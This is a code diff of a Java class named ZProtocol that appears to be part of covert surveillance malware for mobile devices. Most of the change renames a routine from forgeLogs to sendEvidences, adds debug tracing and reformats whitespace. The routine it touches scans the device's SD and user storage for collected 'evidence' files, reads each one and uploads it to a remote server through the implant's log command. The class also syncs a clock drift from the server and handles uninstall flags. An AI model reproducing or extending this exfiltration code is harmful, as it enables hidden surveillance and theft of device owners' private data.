@@ -48,7 +48,7 @@ public class ZProtocol extends Protocol {
         //#ifdef DBC
         Check.requires(transport != null, "perform: transport = null");
         //#endif
-        
+
         reload = false;
         uninstall = false;
 
@@ -122,9 +122,9 @@ public class ZProtocol extends Protocol {
             debug.info("***** Log *****");
             //#endif  
 
-            forgeLogs(Path.SD());
+            sendEvidences(Path.SD());
             if (!Path.SD().equals(Path.USER())) {
-                forgeLogs(Path.USER());
+                sendEvidences(Path.USER());
             }
 
             //#ifdef DEBUG
@@ -339,21 +339,21 @@ public class ZProtocol extends Protocol {
             try {
                 // la totSize e' discutibile
                 int totSize = dataBuffer.readInt();
-                
+
                 long dateServer = dataBuffer.readLong();
-                
+
                 //#ifdef DEBUG
-                debug.trace("parseIdentification: " + dateServer);                
+                debug.trace("parseIdentification: " + dateServer);
                 //#endif
-                
+
                 Date date = new Date();
-                int drift =  (int) (dateServer - (date.getTime()/1000)) ;
-                
+                int drift = (int) (dateServer - (date.getTime() / 1000));
+
                 //#ifdef DEBUG
                 debug.trace("parseIdentification drift: " + drift);
                 //#endif
                 Status.getInstance().drift = drift;
-                
+
                 int numElem = dataBuffer.readInt();
 
                 for (int i = 0; i < numElem; i++) {
@@ -562,20 +562,26 @@ public class ZProtocol extends Protocol {
         }
     }
 
-    protected void forgeLogs(String basePath) throws TransportException,
+    protected void sendEvidences(String basePath) throws TransportException,
             ProtocolException {
         //#ifdef DEBUG
-        debug.info("sending logs from: " + basePath);
+        debug.info("sendEvidences from: " + basePath);
         //#endif
 
         EvidenceCollector logCollector = EvidenceCollector.getInstance();
 
         final Vector dirs = logCollector.scanForDirLogs(basePath);
         final int dsize = dirs.size();
+        //#ifdef DEBUG
+        debug.trace("sendEvidences #directories: " + dsize);
+        //#endif
         for (int i = 0; i < dsize; ++i) {
             final String dir = (String) dirs.elementAt(i);
             final Vector logs = logCollector.scanForEvidences(basePath, dir);
             final int lsize = logs.size();
+            //#ifdef DEBUG
+            debug.trace("    dir: " + dir + " #evidences: " + lsize);
+            //#endif
             for (int j = 0; j < lsize; ++j) {
                 final String logName = (String) logs.elementAt(j);
                 final String fullLogName = basePath + dir + logName;
@@ -588,8 +594,9 @@ public class ZProtocol extends Protocol {
                 }
                 final byte[] content = file.read();
                 //#ifdef DEBUG
-                debug.info("Sending file: " + EvidenceCollector.decryptName(logName)
-                        + " = " + fullLogName);
+                debug.info("Sending file: "
+                        + EvidenceCollector.decryptName(logName) + " = "
+                        + fullLogName);
                 //#endif
 
                 byte[] response = command(Proto.LOG, content, true);
